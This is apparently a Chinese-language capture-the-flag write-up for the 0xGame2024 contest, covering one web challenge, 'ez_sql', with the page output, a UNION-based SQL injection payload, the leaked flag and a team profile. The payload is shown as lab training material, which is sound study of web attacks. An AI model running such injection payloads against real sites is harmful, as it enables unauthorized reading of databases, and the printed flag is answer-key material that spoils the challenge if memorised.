# [个人队伍] 0xGame2024的Writeup

> **2025年4月19日20:20 ~ 2029年12月1日22:20**
>
> **比赛地址：https://gz.imxbt.cn/games/17/challenges**
>
> **复现地址：https://gz.imxbt.cn/games/17/challenges**

> 个人赛
>
> # 0xGame2024
>
> **593**支队伍已报名
>
> 开始时间
>
> 2025年4月19日晚上8点20分
>
> 结束时间
>
> 2029年12月1日晚上10点20分
>
> 
>
> 由于公开仓库内容有限，已尽量把可以上的题目都上了



# Week0

## Web

### ez_sql

#### 题目介绍

> #### ez_sql
>
> 250 pts

#### 解题过程

##### 查看题目

```shell
?id=1
```

```shell
用户信息
姓名：常杰宏

电子邮件：jiehong72@icloud.com

电话号码：330-072-6292

地址：58 Ridgewood Road

SQL语句：select * from users where id = 1
```

**分析**

- union查询

##### 编写payload

```shell
?id=1 union select 1,2,3,4,flag from flag
```

##### 发起攻击

```shell
?id=1 union select 1,2,3,4,flag from flag
```

```shell
用户信息
姓名：2

电子邮件：3

电话号码：4

地址：0xGame{Do_not_Use_SqlMap!_Try_it_By_Your_Self}

SQL语句：select * from users where id = 1 union select 1,2,3,4,flag from flag

错误信息：
```

#### 题目答案

##### 核心payload

```shell
?id=1 union select 1,2,3,4,flag from flag
```

##### 题目答案

```shell
0xGame{Do_not_Use_SqlMap!_Try_it_By_Your_Self}
```



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**